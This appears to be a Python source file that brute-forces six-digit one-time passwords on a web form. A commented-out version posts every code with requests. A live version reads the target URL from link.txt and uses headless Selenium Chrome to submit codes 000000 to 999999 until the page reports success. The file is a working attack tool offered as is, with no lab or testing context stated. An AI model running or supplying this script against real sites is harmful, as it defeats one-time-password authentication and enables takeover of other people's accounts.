# import requests
# import time

# def brute_force_attack(target_url):
    
#     for otp in range(1000000):
#         otp_str = f"{otp:06d}"
#         print(f"Trying OTP: {otp_str}")
        
#         try:
#             data = {'otp': otp_str}
#             response = requests.post(target_url, data=data, timeout=5)
            
#             if "success" in response.text.lower():
#                 success_msg = f"SUCCESS! Found valid OTP: {otp_str}"
#                 print(success_msg)
#                 print(f"Response from server: {response.text}")
#                 return True
            
#             # Small delay to avoid overwhelming the server
#             time.sleep(0.01)
            
#         except requests.exceptions.RequestException as e:
#             print(f"Request failed for OTP {otp_str}: {str(e)}")
#             time.sleep(1)  # Longer delay if there's an error
    
#     print("Brute force completed. No valid OTP found in the range 000000-999999.")
#     return False




# if __name__ == "__main__":

#     try:
#         with open('link.txt', 'r') as f:
#             target_url = f.read().strip()
#     except FileNotFoundError:
#         print("ERROR: link.txt not found in repository root")
        
    
#     print(f"Starting brute force attack on: {target_url}")
#     print("Searching for valid OTP between 000000 and 999999...")
    
#     brute_force_attack(target_url)
















import requests
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def brute_force_attack():
    try:
        with open('link.txt', 'r') as f:
            target_url = f.read().strip()
    except FileNotFoundError:
        print("ERROR: link.txt not found in repository root")
        return False
    
    print(f"Starting brute force attack on: {target_url}")
    print("Searching for valid OTP between 000000 and 999999...")
    
    # Set up Chrome options for headless mode
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    
    driver = None
    try:
        driver = webdriver.Chrome(options=chrome_options)
        
        for otp in range(1000000):
            otp_str = f"{otp:06d}"
            print(f"Trying OTP: {otp_str}")
            
            try:
                driver.get(target_url)
                
                # Wait for the OTP input field to be available
                otp_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "otp"))
                )
                
                # Clear the input field and enter the OTP
                otp_input.clear()
                otp_input.send_keys(otp_str)
                
                # Submit the form
                otp_input.submit()
                
                # Wait for response and check for success
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                page_source = driver.page_source.lower()
                if "success" in page_source:
                    success_msg = f"SUCCESS! Found valid OTP: {otp_str}"
                    print(success_msg)
                    print(f"Current URL: {driver.current_url}")
                    return True
                
                # Small delay to avoid overwhelming the server
                time.sleep(0.1)
                
            except Exception as e:
                print(f"Error processing OTP {otp_str}: {str(e)}")
                time.sleep(1)  # Longer delay if there's an error
                
    except Exception as e:
        print(f"Error setting up browser: {str(e)}")
    finally:
        if driver:
            driver.quit()
    
    print("Brute force completed. No valid OTP found in the range 000000-999999.")
    return False

if __name__ == "__main__":
    brute_force_attack()
